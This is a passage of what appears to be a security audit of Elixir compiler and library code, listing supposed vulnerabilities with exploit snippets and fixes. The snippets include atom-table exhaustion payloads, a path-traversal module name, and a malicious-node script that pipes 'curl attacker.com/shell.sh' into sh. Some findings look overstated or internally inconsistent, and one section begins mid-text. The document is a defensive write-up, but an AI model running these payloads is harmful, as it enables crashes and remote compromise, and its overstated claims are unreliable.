via ets:give_away/3.

Fix
---
Option 1 - Use `protected` access and give_away for the compiler spawn:

    DataSet = ets:new(Module, [set, protected]),
    DataBag = ets:new(Module, [duplicate_bag, protected]),

    %% In the spawned compiler function, transfer ownership:
    ets:give_away(DataSet, SpawnedPid, []),
    ets:give_away(DataBag, SpawnedPid, []),

Option 2 - Use `private` access and serialize the needed data:

    DataSet = ets:new(Module, [set, private]),
    DataBag = ets:new(Module, [duplicate_bag, private]),

    %% Pass required data to spawned process via arguments
    %% instead of direct ETS access.

Option 3 - At minimum, use `{heir, self(), []}` to prevent table loss
if the owning process crashes, and restrict to `protected`.

Vulnerability: Unsafe Deserialization via binary_to_term/1 Without safe Option in Compiled BEAM Code
=====================================================================================================

File: lib/elixir/src/elixir_erl.erl, line 117
Severity: High (Unsafe Deserialization / Atom Table Exhaustion DoS / BEAM File Tampering)

Description
-----------
The `elixir_to_erl/2` function handles PIDs, ports, and references by
serializing them at compile time and emitting Erlang AST that deserializes
them at runtime using `erlang:binary_to_term/1` WITHOUT the `safe` option:

    elixir_to_erl(Tree, Ann) when is_pid(Tree); is_port(Tree); is_reference(Tree) ->
      ?remote(Ann, erlang, binary_to_term, [elixir_to_erl(term_to_binary(Tree), Ann)]);

The `?remote` macro expands this to an Erlang AST call node:

    {call, Ann,
      {remote, Ann, {atom, Ann, erlang}, {atom, Ann, binary_to_term}},
      [<serialized binary as literal>]}

This means the compiled BEAM file contains:
1. A binary literal (the output of `term_to_binary/1` for the pid/port/ref)
2. A call to `erlang:binary_to_term/1` that deserializes this literal at runtime

`erlang:binary_to_term/1` (without `[safe]`) is a well-known unsafe
deserialization primitive. The `safe` option (available since OTP R13B04)
exists specifically to mitigate the following risks:

- **Atom creation**: `binary_to_term/1` creates new atoms for any atom
  encoded in the binary (node names in PIDs, ports, references). Atoms
  are never garbage collected in the BEAM VM. An attacker who controls
  the binary payload can create arbitrary atoms, exhausting the atom
  table (default limit: 1,048,576) and crashing the VM.

- **Arbitrary term construction**: Without `safe`, `binary_to_term/1`
  can construct any Erlang term from the binary, including function
  references that may not exist in the running system.

Attack Vector 1: BEAM File Tampering (Supply Chain)
----------------------------------------------------
The serialized binary is embedded as a literal in the .beam file. An
attacker who can modify compiled .beam files (e.g., in a compromised
Hex package that ships precompiled .beam files, a tampered build cache,
or a supply chain attack on _build artifacts) can replace the legitimate
serialized PID/port/reference binary with a crafted payload:

    %% Original binary in .beam: term_to_binary(pid(0,100,0))
    %% Attacker replaces with a binary containing millions of unique atoms:
    %%   term_to_binary({atom1, atom2, ..., atom1000000})
    %% When the module loads and the code path executes,
    %% binary_to_term/1 creates all these atoms, exhausting the table.

The attacker's modified binary is deserialized without validation when
the code path containing the literal is executed at runtime.

Attack Vector 2: Atom Table Exhaustion via Controlled PIDs
-----------------------------------------------------------
Even without BEAM file tampering, PIDs contain their origin node name
as an atom. If an attacker can influence which PIDs are captured in
compile-time expressions (e.g., via a malicious dependency that returns
PIDs from nodes with long, unique names during compilation), each
compiled module will generate a `binary_to_term/1` call that creates
a unique atom at runtime:

    # Malicious dependency - returns PIDs from fake nodes
    defmodule Evil do
      def get_worker() do
        # Create a PID referencing a node with a unique atom name
        # This PID, when used in a module attribute or quote,
        # gets compiled via elixir_to_erl line 117
        :erlang.list_to_pid('<unique_node_name_#{:rand.uniform()}@host.0.0.0>')
      end
    end

    # Victim code
    defmodule MyModule do
      @cached_pid Evil.get_worker()  # PID embedded via elixir_to_erl
    end

Each compilation creates a new unique atom in the binary literal.
Over many compilations or modules, the atom table fills up.

Attack Vector 3: Debug Info Exploitation
-----------------------------------------
The `debug_info/4` callback (lines 22-24) reconstructs Erlang forms
from stored debug info, which includes the serialized binary literals.
Tools that process debug info (dialyzer, debugger, IDE tools) will
trigger the `binary_to_term/1` calls when loading modules, expanding
the attack surface beyond direct code execution.

Code Path Analysis
------------------
`elixir_to_erl/2` is called from multiple locations in the compiler:

1. `definition_to_anonymous/5` (line 61-64): Converts definitions to
   anonymous functions, then evaluates them with `erl_eval:expr/4`.
   PIDs/ports/refs in the definitions become `binary_to_term/1` calls
   that execute immediately during compilation via erl_eval.

2. `exports_md5_info/4` (line 351): Converts MD5 to Erlang AST.

3. `functions_info/1`, `macros_info/1`, `struct_info/1`,
   `deprecated_info/1`: Convert module metadata to Erlang AST embedded
   in the `__info__/1` function.

4. Any Elixir code that uses `Macro.escape/1` on a term containing
   PIDs/ports/refs (the `do_escape/2` function in `elixir_quote.erl`
   calls `elixir_to_erl` for these types).

Impact
------
- Atom table exhaustion (VM crash): crafted binaries in tampered BEAM
  files can create millions of atoms when deserialized, crashing the
  entire Erlang VM (not just the Elixir application).
- Supply chain attack via precompiled BEAM files: Hex packages can
  include precompiled .beam files. A tampered binary literal in such
  a file executes `binary_to_term/1` on attacker-controlled data.
- The atom table is a VM-global resource -- exhausting it affects ALL
  applications running on the same VM (Phoenix, Ecto, etc.).
- No runtime validation: the deserialized term is used directly with
  no type checking or sanitization.
- Affects any Elixir code path that compiles or evaluates expressions
  containing PIDs, ports, or references.

Root Cause
----------
`erlang:binary_to_term/1` is used instead of `erlang:binary_to_term/2`
with the `[safe]` option. The `safe` option prevents creation of new
atoms, new external function references, and new anonymous functions
during deserialization, mitigating the atom exhaustion and arbitrary
term construction risks.

Fix
---
Use `binary_to_term/2` with the `safe` option in the generated code:

    elixir_to_erl(Tree, Ann) when is_pid(Tree); is_port(Tree); is_reference(Tree) ->
      SafeOpt = {cons, Ann, {atom, Ann, safe}, {nil, Ann}},
      ?remote(Ann, erlang, binary_to_term,
        [elixir_to_erl(term_to_binary(Tree), Ann), SafeOpt]);


Vulnerability: Arbitrary File Write via Path Traversal in binary_to_path/2
==========================================================================

File: lib/elixir/src/elixir_compiler.erl, lines 244-249
Severity: Critical (Arbitrary File Write)

Description
-----------
The function binary_to_path/2 constructs a file path from a compiled module
name without any sanitization or validation:

    binary_to_path({ModuleName, Binary}, CompilePath) ->
      Path = filename:join(CompilePath, atom_to_list(ModuleName) ++ ".beam"),
      case file:write_file(Path, Binary) of
        ok -> Path;
        {error, Reason} -> error(...)
      end.

The ModuleName atom is derived from compiled Elixir source code. In Elixir,
module names are atoms, and atoms can contain arbitrary characters including
path separators ("/" or ".."). The atom_to_list(ModuleName) call converts
this directly to a string which is then joined with CompilePath via
filename:join/2. No check is performed to ensure the resulting path stays
within the intended CompilePath directory.

Exploit (Arbitrary File Write via Path Traversal)
-------------------------------------------------
An attacker who controls Elixir source compiled during bootstrap (or any
context where binary_to_path is invoked) can define a module with a
path-traversal name:

    defmodule :"Elixir.../../../../../../tmp/evil" do
    end

When binary_to_path is called with CompilePath = "lib/elixir/ebin", the
resulting path becomes:

    filename:join("lib/elixir/ebin", "Elixir.../../../../../../tmp/evil.beam")

which resolves to /tmp/evil.beam (or any other attacker-chosen location).
The file:write_file/2 call then writes attacker-controlled binary content
(the compiled BEAM bytecode) to that arbitrary path.

Impact
------
- Arbitrary file write to any location writable by the compiling process
- Can overwrite critical system files or inject malicious BEAM modules into
  other application code paths
- In CI/CD pipelines running compilation as root or with elevated privileges,
  this can lead to full system compromise
- Supply-chain attack vector: a malicious dependency could include a module
  with a crafted name that writes to unexpected locations during compilation

Remediation
-----------
Sanitize ModuleName before path construction by rejecting or stripping path
separator characters. For example:

    safe_name(ModuleName) ->
      Name = atom_to_list(ModuleName),
      case lists:member($/, Name) orelse string:find(Name, "..") =/= nomatch of
        true -> error({invalid_module_name, ModuleName});
        false -> Name
      end.

Vulnerability: Atom Table Exhaustion via Unbounded list_to_atom in Variable Name Generation
============================================================================================

File: lib/elixir/src/elixir_erl_var.erl, lines 48-49 and 69-70
Severity: High (Denial of Service - VM-wide crash via atom table exhaustion)

Description
-----------
The functions build_name/2 (lines 48-49) and to_erl_var/1 (line 69-70) create
new Erlang atoms for every variable encountered during compilation using
list_to_atom/1:

    build_name('_', Count) -> list_to_atom("_@" ++ integer_to_list(Count));
    build_name(Name, Count) -> list_to_atom("_" ++ atom_to_list(Name) ++ "@" ++ integer_to_list(Count)).

    to_erl_var(Counter) ->
      list_to_atom("_@" ++ integer_to_list(Counter)).

In the BEAM VM, atoms are NEVER garbage collected and the atom table has a
hard limit (default 1,048,576). Each unique variable name + counter combination
produces a unique atom (e.g., _x@1, _x@2, _foo@1, _bar@3). These atoms persist
for the lifetime of the VM.

The build/2 function (lines 39-46) increments the counter on every variable
assignment, and each new counter value produces a new atom:

    build(Key, #elixir_erl{counter=Counter} = S) ->
      Count =
        case Counter of
          #{Key := Val} -> Val + 1;
          _ -> 1
        end,
      {build_name(Key, Count),
       S#elixir_erl{counter=Counter#{Key => Count}}}.

There is NO limit on the counter value, and NO check against the atom table
capacity before creating new atoms. Each call to build/2 with a new Key or
incremented Count creates an atom that persists forever.

Exploit (Atom Table Exhaustion via Macro-Generated Variables)
--------------------------------------------------------------
A malicious macro can generate code with a large number of unique variable
names or deeply nested scopes that re-bind the same variable, each producing
a new atom via build_name:

    defmodule Bomb do
      defmacro exhaust_atoms(n) do
        vars = for i <- 1..n do
          name = :"v#{i}"
          quote do: unquote(Macro.var(name, __MODULE__)) = unquote(i)
        end
        {:__block__, [], vars}
      end
    end

    defmodule Victim do
      require Bomb
      Bomb.exhaust_atoms(500_000)  # Creates 500,000 unique atoms
    end

Each unique variable name (v1, v2, ..., v500000) generates a corresponding
_v1@1, _v2@1, ..., _v500000@1 atom in build_name. Combined with the original
variable name atoms, this creates ~1,000,000 atoms from a single module --
enough to exhaust the default atom table.

A more stealthy attack via Code.eval_string in a loop:

    # In a malicious dependency's Application.start callback:
    for i <- 1..1_000_000 do
      Code.eval_string("v#{i} = #{i}")
    end

Each eval_string call compiles and executes the code, creating new atoms via
build_name and to_erl_var. The atoms accumulate across evaluations since
they are never garbage collected.

The same attack works in IEx, LiveBook, and any context that repeatedly
compiles Elixir code with distinct variable names:

    # LiveBook notebook cell:
    Enum.each(1..500_000, fn i ->
      Code.eval_string("var_#{i} = :ok")
    end)
    # VM crashes with "no more index entries in atom_tab"

Additionally, build_name can crash the compiler directly via system_limit
when a variable name is close to the 255-character atom limit. The function
prepends "_" and appends "@N" to the name, potentially exceeding the limit:

    # Variable name at 253 characters + "_" prefix + "@1" suffix = 257 chars
    # list_to_atom raises system_limit, crashing the compiler
    long_name = String.duplicate("a", 253) |> String.to_atom()
    Code.eval_string("#{long_name} = 1")

Impact
------
- VM-wide crash: atom table exhaustion kills the entire BEAM VM, not just
  the compiling process. ALL applications on the node (Phoenix, Ecto,
  background jobs, etc.) die simultaneously.
- Supply chain attack: a malicious Hex dependency can exhaust the atom table
  via a macro that generates many unique variable names. The attack triggers
  at compile time when the victim compiles their project.
- Persistent resource leak: even if the attacker's code is later removed,
  the atoms created during compilation persist until VM restart. Over time,
  incremental recompilation with macros that generate fresh variable names
  gradually exhausts the table.
- LiveBook/IEx DoS: in shared environments (multi-tenant LiveBook, shared
  dev servers), one user can crash the VM for all users by evaluating code
  that creates many unique variables.
- Compiler crash via system_limit: crafted long variable names cause
  list_to_atom to fail with system_limit, crashing compilation with an
  opaque error.
- No warning or limit: there is no check on the counter value, no limit on
  the number of unique atoms created, and no diagnostic when the atom table
  is approaching capacity.

Root Cause
----------
1. list_to_atom/1 is used instead of list_to_existing_atom/1 or a bounded
   atom creation strategy. Every unique variable name + counter combination
   creates a new permanent atom.
2. The build/2 function has no upper bound on the counter, allowing unbounded
   atom creation within a single compilation unit.
3. No atom table capacity check is performed before creating atoms.
4. No length check on the resulting atom name in build_name/2 before calling
   list_to_atom, allowing system_limit crashes.

Fix
---
Option 1 - Use an integer-indexed variable scheme instead of atom names:

    %% Replace atom-based variable naming with integer indices
    %% that map to a bounded set of generated atoms
    build(Key, #elixir_erl{counter=Counter} = S) ->
      Count = case Counter of
        #{Key := Val} -> Val + 1;
        _ -> 1
      end,
      MaxAtoms = 65536,
      Index = erlang:phash2({Key, Count}, MaxAtoms),
      Name = list_to_atom("_v@" ++ integer_to_list(Index)),
      {Name, S#elixir_erl{counter=Counter#{Key => Count}}}.

Option 2 - Add a counter limit and length check:

    build(Key, #elixir_erl{counter=Counter} = S) ->
      Count = case Counter of
        #{Key := Val} when Val < 100000 -> Val + 1;
        #{Key := _} -> error({too_many_variable_versions, Key});
        _ -> 1
      end,
      Name = build_name(Key, Count),
      {Name, S#elixir_erl{counter=Counter#{Key => Count}}}.

    build_name(Name, Count) ->
      NameStr = "_" ++ atom_to_list(Name) ++ "@" ++ integer_to_list(Count),
      case length(NameStr) > 255 of
        true -> error({variable_name_too_long, Name});
        false -> list_to_atom(NameStr)
      end.

Option 3 - Reuse atoms via an ETS-based or process-dictionary cache with
a fixed pool of generated variable names, recycling them across compilations.

file:read_link_info/1 (which does NOT follow symlinks), but none of the
other functions use the non-following variant. This inconsistency means
that security-relevant file type checks via read_file_type follow symlinks
while the result is used as if the path itself was verified.

The core issue is a classic TOCTOU (Time-of-Check-Time-of-Use) race
condition: file metadata is queried at one point in time, then the path
is operated on at a later point, and between those two operations an
attacker can swap a symlink target.

Attack Vector 1: Compilation Cache Poisoning via Symlink Race
--------------------------------------------------------------
Mix uses read_posix_mtime_and_size/1 (via Mix.Utils.last_modified_and_size/1
in lib/mix/lib/mix/utils.ex:258) to determine whether source files need
recompilation. The staleness check compares the mtime/size of source files
against compiled .beam files. Since read_posix_mtime_and_size follows
symlinks, an attacker can exploit this:

1. A malicious Hex dependency creates a symlink in _build/ pointing a
   .beam file path to an attacker-controlled file with a future mtime.

2. Mix calls read_posix_mtime_and_size on the symlink path, gets the
   attacker-controlled mtime/size (from the symlink target), and
   concludes the .beam file is up-to-date.

3. The attacker replaces the symlink target with a malicious .beam file
   containing backdoored bytecode.

4. Mix skips recompilation because the mtime check passed. The malicious
   .beam is loaded at runtime.

5. Even if the developer modifies the source, the attacker can keep
   resetting the mtime via the symlink to prevent recompilation
   indefinitely.

Attack Vector 2: Arbitrary File Mtime Tampering via File.touch/2
-----------------------------------------------------------------
change_posix_time/2 and change_universal_time/2 are exposed via the
public File.touch/2 API (lib/elixir/lib/file.ex, lines 721-735). These
functions follow symlinks when writing file metadata:

    change_posix_time(Name, Time) when is_integer(Time) ->
      file:write_file_info(Name, #file_info{mtime=Time}, [raw, {time, posix}]).

If Name is a symlink, the mtime of the TARGET file is modified, not the
symlink itself. An attacker who controls a directory on the file system
(e.g., a temp directory, a dependency's priv/ directory, or _build/) can:

1. Create a symlink: deps/evil/priv/cache -> /path/to/victim/file
2. Call File.touch("deps/evil/priv/cache", 0) which resolves through
   change_posix_time -> file:write_file_info on the symlink
3. The victim file's mtime is reset to epoch (1970-01-01)

This can be used to:
- Force unnecessary recompilation of arbitrary files (setting mtime to 0)
- Prevent recompilation of tampered files (setting mtime to the future)
- Manipulate cache invalidation in any system using file mtimes

Attack Vector 3: TOCTOU in File.regular?/File.dir? Security Checks
--------------------------------------------------------------------
File.regular?/1 and File.dir?/1 use read_file_type/1 which follows
symlinks (lib/elixir/lib/file.ex, lines 181, 218):

    :elixir_utils.read_file_type(IO.chardata_to_string(path), opts)

Code that checks File.regular?(path) and then reads/compiles the file
is vulnerable to a symlink swap between the check and the use:

    # Common pattern in build tools and code loaders
    if File.regular?(path) do
      Code.compile_file(path)    # TOCTOU: path may now point elsewhere
    end

Between File.regular? (which follows the symlink to confirm it's a
regular file) and Code.compile_file (which reads the file content),
an attacker can redirect the symlink to a different file -- including
one containing malicious Elixir code that gets compiled and executed.

Attack Vector 4: Mix.Utils.last_modified_and_size Future-Mtime Reset
----------------------------------------------------------------------
Mix.Utils.last_modified_and_size/1 (lib/mix/lib/mix/utils.ex:255-272)
has an auto-correction path for future mtimes:

    case :elixir_utils.read_posix_mtime_and_size(path) do
      {:ok, mtime, size} when mtime > now ->
        Mix.shell().error(message)
        File.touch(path, now)       # Follows symlinks!
        {mtime, size}

When a file has a future mtime, Mix calls File.touch(path, now) to reset
it. If path is a symlink, File.touch follows it (via change_posix_time),
modifying the TARGET file's mtime. An attacker can:

1. Create a symlink pointing to a critical file (e.g., a security config)
2. Set the symlink's apparent mtime to the future (via the symlink target)
3. Mix's staleness check triggers the auto-correction
4. File.touch follows the symlink and modifies the real file's mtime
5. This can disrupt mtime-based change detection in other systems that
   monitor the target file

Contrast with read_link_type
-----------------------------
The existence of read_link_type/1 (line 112-116) demonstrates awareness
of the symlink distinction:

    read_link_type(File) ->
      case file:read_link_info(File) of    % Does NOT follow symlinks
        {ok, #file_info{type=Type}} -> {ok, Type};
        {error, _} = Error -> Error
      end.

This function correctly uses file:read_link_info which returns the type
of the symlink itself (type=symlink) rather than the target. However,
read_file_type uses file:read_file_info which follows symlinks and
returns the TARGET's type -- making the symlink invisible to the caller.

The inconsistency is dangerous: code using read_file_type believes it is
checking the path itself, but is actually checking an arbitrary target
that an attacker can control via symlink manipulation.

Impact
------
- Compilation cache poisoning: a malicious dependency can prevent
  recompilation of tampered .beam files by manipulating mtime checks
  through symlinks, persisting backdoored bytecode across builds.
- Arbitrary file metadata modification: File.touch follows symlinks,
  allowing any code that can create symlinks to modify the mtime of
  files it shouldn't have access to.
- Security check bypass: File.regular?/File.dir? follow symlinks,
  enabling TOCTOU attacks where a symlink is swapped between the
  check and the file operation.
- Supply chain attack: a malicious Hex dependency can exploit these
  issues by creating symlinks in its priv/ directory, in _build/,
  or in any writable location during compilation.
- The attack is silent: no warnings or errors are generated when
  operating on symlinks. The caller has no indication that a symlink
  was followed.
- Affects Mix compilation, File module operations, and any Elixir
  code that uses these functions for file type or staleness checks.

Root Cause
----------
1. read_file_type/1,2 uses file:read_file_info (symlink-following)
   instead of file:read_link_info (non-following) for file type checks.
2. change_posix_time/2 and change_universal_time/2 use
   file:write_file_info which follows symlinks, with no option to
   operate on the symlink itself.
3. read_posix_mtime_and_size/1 uses file:read_file_info which follows
   symlinks, making staleness checks vulnerable to symlink redirection.
4. No path canonicalization (e.g., resolving symlinks to absolute paths
   and verifying the result is within expected boundaries) is performed
   before operating on files.

Fix
---
Option 1 - Add symlink-safe variants of all file operations:

    %% Non-symlink-following file type check
    read_file_type_nofollow(File) ->
      case file:read_link_info(File, [{time, posix}]) of
        {ok, #file_info{type=symlink}} -> {error, symlink};
        {ok, #file_info{type=Type}} -> {ok, Type};
        {error, _} = Error -> Error
      end.

    %% Safe mtime read that rejects symlinks
    read_posix_mtime_and_size_nofollow(File) ->
      case file:read_link_info(File, [raw, {time, posix}]) of
        {ok, #file_info{type=symlink}} -> {error, symlink};
        {ok, #file_info{mtime=Mtime, size=Size}} -> {ok, Mtime, Size};
        {error, _} = Error -> Error
      end.

Option 2 - Add path canonicalization before file operations:

    safe_resolve(Path, AllowedPrefix) ->
      Resolved = filename:absname(Path),
      case lists:prefix(AllowedPrefix, Resolved) of
        true -> {ok, Resolved};
        false -> {error, path_traversal}
      end.

Option 3 - Use O_NOFOLLOW semantics where available (requires NIF
or platform-specific handling) to ensure file operations fail when
the path is a symlink rather than silently following it.

Vulnerability: Remote Code Execution via --remsh (Erlang Distribution Trust Model Abuse)
=========================================================================================

File: lib/elixir/src/iex.erl, lines 54-75
Severity: Critical (Remote Code Execution on client machine)

Description
-----------
The iex:shell/0 function implements the --remsh flag, which connects
the local IEx session to a remote Erlang node via Erlang distribution.
The Erlang distribution protocol is bidirectional and fully trusted:
once two nodes are connected, EITHER node can execute arbitrary code
on the OTHER. This means connecting to a malicious remote node via
`iex --remsh <attacker_node>` gives the attacker full remote code
execution on the user's local machine.

The vulnerable code path (lines 54-71):

    case get_remsh(Args) of
      nil ->
        start_mfa(Args, {elixir, start_cli, []});

      Remote ->
        Ref = make_ref(),

        Parent =
          spawn_link(fun() ->
            receive
              {'begin', Ref, Other} ->
                elixir:start_cli(),
                Other ! {done, Ref}
            end
          end),

        {remote, Remote, start_mfa(Args, {?MODULE, sync_remote, [Parent, Ref]})}
    end.

And the sync_remote function (lines 73-75):

    sync_remote(Parent, Ref) ->
      Parent ! {'begin', Ref, self()},
      receive {done, Ref} -> ok end.

Multiple issues compound here:

1. NO REMOTE NODE VALIDATION (line 85): get_remsh/1 takes the raw
   --remsh argument and passes it through without any validation of
   the node identity. There is no TLS, no certificate pinning, no
   hostname verification, and no user confirmation prompt. The only
   authentication is the Erlang cookie (~/.erlang.cookie), which is
   often a weak or default value.

2. BIDIRECTIONAL TRUST / RCE (lines 58-71): Once Erlang distribution
   is established, the remote node can call erlang:spawn/4 or rpc:call/4
   to execute arbitrary functions on the local node with the full
   privileges of the local BEAM process. This is inherent to Erlang
   distribution but the code makes no attempt to warn the user or
   restrict the connection scope.

3. LOCAL PID AND REF LEAKED TO REMOTE (line 70): The MFA tuple sent
   to the remote node contains Parent (a local PID) and Ref (a local
   reference). The remote node's sync_remote/2 uses these to send
   {'begin', Ref, self()} back to Parent, triggering elixir:start_cli()
   on the local node. A malicious remote node can:
   - Trigger start_cli() to process -e expressions on the local node
   - Send crafted messages to Parent at arbitrary times
   - Never send {done, Ref} back, hanging the local process indefinitely

4. NO TIMEOUT ON RECEIVE (lines 63-67, 75): Both the Parent process
   and sync_remote/2 use bare receive blocks with no after clause.
   A malicious or unresponsive remote node can hang the local IEx
   session indefinitely with no way to recover.

Exploit Scenario
----------------
An attacker sets up a malicious Erlang node with a known name and
a commonly used or leaked cookie:

    # Attacker's machine
    erl -sname evil -setcookie common_cookie -eval '
      register(shell, spawn(fun() ->
        receive _ -> ok end
      end)),
      % Wait for victim to connect, then execute on their node
      timer:sleep(5000),
      Nodes = nodes(),
      [rpc:call(N, os, cmd, ["curl attacker.com/shell.sh | sh"])
       || N <- Nodes]
    '

When a user connects:

    iex --sname victim --remsh evil@attacker-host

The attacker's node gains full RCE on the victim's machine via
rpc:call/4 over the established Erlang distribution connection.

This attack is especially dangerous in:
- Development environments where developers connect to shared nodes
- Cloud/container environments where node names are predictable
- CI/CD systems that use --remsh for remote inspection
- Tutorials/documentation that instruct users to connect to nodes

Impact
------
- Full remote code execution on the machine of any user who connects
  to a malicious Erlang node via iex --remsh.
- The attacker can read/write files, exfiltrate secrets, install
  backdoors, pivot to other systems - anything the BEAM process owner
  can do.
- No user interaction required beyond running the iex --remsh command.
- The attack is silent - the user sees a normal IEx prompt while the
  attacker's code executes in the background.
- Supply chain risk: documentation, tutorials, or scripts that include
  --remsh commands pointing to attacker-controlled nodes.

Root Cause
----------
The fundamental issue is that iex:shell/0 establishes an Erlang
distribution connection (which grants mutual full code execution)
without any safeguards:
- No TLS/certificate verification for node identity
- No user confirmation or warning about trust implications
- No restriction on what the remote node can execute locally
- No timeout or deadman switch on the synchronization protocol

Fix
---
1. Warn users when connecting via --remsh that the remote node will
   have full code execution access on their local machine, and require
   explicit confirmation.

2. Enforce TLS for distribution connections when using --remsh by
   default (Erlang/OTP supports this via -ssl_dist_opt).

3. Add a timeout to the receive blocks in both the Parent process
   and sync_remote/2:

    Parent =
      spawn_link(fun() ->
        receive
          {'begin', Ref, Other} ->
            elixir:start_cli(),
            Other ! {done, Ref}
        after 30000 ->
            io:format(standard_error,
              "Timeout connecting to remote node~n", []),
            init:stop(1)
        end
      end),

4. Consider implementing a restricted RPC mode that limits what
   the remote node can execute on the local node, rather than
   relying on Erlang distribution's default full-trust model.

Vulnerability: Atom Table Exhaustion via binary_to_atom in Parser (VM Crash DoS)
=================================================================================

File: lib/elixir/src/elixir_parser.erl, lines 385-398
Severity: Critical (Denial of Service - entire BEAM VM crash, not just process)

Description
-----------
The `build_quoted_atom` function in the parser calls `erlang:binary_to_atom/2`
for every quoted atom literal (e.g., :"some_atom") and quoted keyword key
(e.g., "some_key": value) when the `existing_atoms_only` option is false
(which is the DEFAULT):

    build_quoted_atom({_, _Location, [H]} = Token, Safe, ExtraMeta) when is_binary(H) ->
      Op = binary_to_atom_op(Safe),
      handle_literal(erlang:Op(H, utf8), Token, ExtraMeta);

    binary_to_atom_op(true)  -> binary_to_existing_atom;
    binary_to_atom_op(false) -> binary_to_atom.

When Safe=false (the default), `erlang:binary_to_atom(H, utf8)` is called,
creating a new atom for every unique quoted atom in the source. The same
pattern exists in the tokenizer (`unsafe_to_atom` in elixir_tokenizer.erl,
lines 1103-1147) where `binary_to_atom`/`list_to_atom` is used for ALL
identifiers, variable names, function names, and unquoted atoms.

Atoms in the BEAM VM are NEVER garbage collected and the atom table has a
fixed maximum size (default 1,048,576). Once exhausted, the entire VM
crashes — not just the offending process, but ALL processes on the node.

Attack Vector
-------------
Any code path that parses untrusted Elixir source without explicitly
setting `existing_atoms_only: true` is vulnerable:

1. `Code.string_to_quoted/2` (default: existing_atoms_only=false)
2. `Code.eval_string/2` 
3. LiveBook cells evaluating user input
4. Educational platforms / online REPLs
5. Any API endpoint that accepts and compiles Elixir code
6. IEx sessions processing untrusted input

Exploit
-------
An attacker sends Elixir source containing millions of unique atom literals:

    # Generate payload
    payload = Enum.map_join(1..2_000_000, "\n", fn i -> ~s/:"atom_#{i}"/ end)
    Code.string_to_quoted(payload)  # Crashes the ENTIRE VM

Or more subtly via unique identifiers:

    # Each unique variable/function name creates a permanent atom
    payload = Enum.map_join(1..2_000_000, "\n", fn i -> "var_#{i} = 1" end)
    Code.string_to_quoted(payload)

The attack requires no macro tricks, no imports, no dependencies — just
raw source text with unique atoms. A single call to Code.string_to_quoted
with a sufficiently large input crashes every process on the VM node.

A malicious Hex dependency can also achieve this more slowly by defining
modules with thousands of unique function names, attributes, and atoms,
gradually filling the atom table across compilation of many files.

Impact
------
- Complete VM crash (not recoverable without restart): the atom table
  exhaustion triggers `eheap_alloc: Cannot allocate N bytes of memory`
  followed by the VM terminating ALL processes on the node.
- Affects the entire Erlang node, not just the parsing process: database
  connections, web servers, background jobs, supervisors — everything dies.
- No graceful degradation: there is no way to catch or recover from atom
  table exhaustion. It is a VM-level fatal error.
- Particularly dangerous for multi-tenant systems (LiveBook, shared
  Erlang nodes, Phoenix apps that evaluate user code).
- The `existing_atoms_only` option exists but is opt-in, not default.
  Most developers are unaware of the risk and use the default.
- Unlike most DoS attacks, this one is PERSISTENT: even after restarting,
  if the same input is parsed again, the VM crashes again.

Root Cause
----------
The parser and tokenizer use `binary_to_atom`/`list_to_atom` by default
for all atom creation during parsing. The safe alternative
(`binary_to_existing_atom`/`list_to_existing_atom`) is only used when
`existing_atoms_only: true` is explicitly passed, which is not the default
for any public API.

The fundamental issue is that parsing — which should be a safe,
side-effect-free operation — permanently mutates global VM state (the
atom table) in a way that cannot be undone and that affects all processes.

Fix
---
1. Change the default for `Code.string_to_quoted/2` to use
   `existing_atoms_only: true`, requiring callers to explicitly opt in
   to atom creation. This is a breaking change but the secure default.

2. Alternatively, add an atom creation budget/limit to the parser that
   caps the number of new atoms created per parse call:

       -define(MAX_NEW_ATOMS_PER_PARSE, 10000).

   Track the count in the parser state and return an error when exceeded.

3. For the tokenizer, add the same budget tracking to `unsafe_to_atom`:

       unsafe_to_atom(Binary, Line, Column, Tokenizer) ->
         case Tokenizer#elixir_tokenizer.new_atom_count > ?MAX_NEW_ATOMS of
           true -> {error, atom_limit_exceeded};
           false ->
             {ok, binary_to_atom(Binary, utf8),
              Tokenizer#elixir_tokenizer{new_atom_count = Count + 1}}
         end.

Fixed: Non-Exhaustive Pattern Match in is_sigil/1 Causes Compiler Crash (DoS) - fixed
======================================================================================

File: lib/elixir/src/elixir_import.erl, lines 188-203
Severity: High (Denial of Service - compiler crash via malicious dependency)

Description
-----------
The `is_sigil/1` function, used by `filter_sigils/1` to determine which
exported functions are sigils during `import Module, only: :sigils`, has
a non-exhaustive pattern match in its inner `case` expression that causes
a `case_clause` runtime exception for certain valid atom names.

The vulnerable code (lines 188-203):

    is_sigil({Name, 2}) ->
      case atom_to_list(Name) of
        "sigil_" ++ Letters ->
          case Letters of
            [L] when L >= $a, L =< $z -> true;       % single lowercase
            [] -> false;                               % empty (just "sigil_")
            [H|T] when H >= $A, H =< $Z ->           % starts with uppercase
                  lists:all(fun(L) -> ... end, T)
          end;
        _ -> false
      end;
    is_sigil(_) -> false.

The inner `case Letters of` has THREE clauses but does NOT cover:

1. Multi-character names starting with a LOWERCASE letter (e.g., "ab"):
   Letters = "ab", H = $a (97). The guard `H >= $A, H =< $Z` requires
   H =< 90, but $a = 97 > 90. Guard fails. No clause matches.

2. Names starting with a digit (e.g., "1x"):
   Letters = "1x", H = $1 (49). $1 < $A (65). Guard fails on all clauses.

3. Single non-lowercase-letter character (e.g., "1"):
   Letters = "1". Not matched by [L] when L >= $a, L =< $z (49 < 97).
   Not matched by []. Not matched by [H|T] when H >= $A (49 < 65).

In all these cases, Erlang raises `{case_clause, Letters}`, which
propagates up through `filter_sigils/1` -> `import_sigil_functions/6` /
`import_sigil_macros/6` -> `calculate_except/7` -> `import_only_except/7`
-> `import/7`, crashing the compilation of the importing module.

Attack Vector
-------------
1. A malicious Hex dependency exports a function with a crafted name:

       defmodule Innocent.Helpers do
         # This function name starts with sigil_ but has a multi-char
         # lowercase name, triggering the crash
         def sigil_ab(content, _modifiers), do: content

         # Legitimate-looking functions
         def helper(x), do: x
       end

2. A victim imports the module with the :sigils filter:

       defmodule Victim do
         import Innocent.Helpers, only: :sigils   # CRASH!
       end

3. The compiler crashes with an opaque Erlang-level error:

       ** (CaseClauseError) no case clause matching: 'ab'
           elixir_import.erl:191: :elixir_import.is_sigil/1
           lists.erl: :lists.filter/2
           elixir_import.erl:111: :elixir_import."-import_sigil_functions/6-fun-0-"/0

   The error message provides no useful context about what went wrong,
   making it difficult to diagnose.

4. Even without malicious intent, the crash can be triggered by any
   Erlang module on the code path that happens to export a function
   matching the pattern `sigil_<lowercase-multi-char>/2`, since
   `get_functions/2` falls back to `Module:module_info(exports)` for
   non-Elixir modules (line 175).

Impact
------
- Denial of Service against the Elixir compiler: a single function
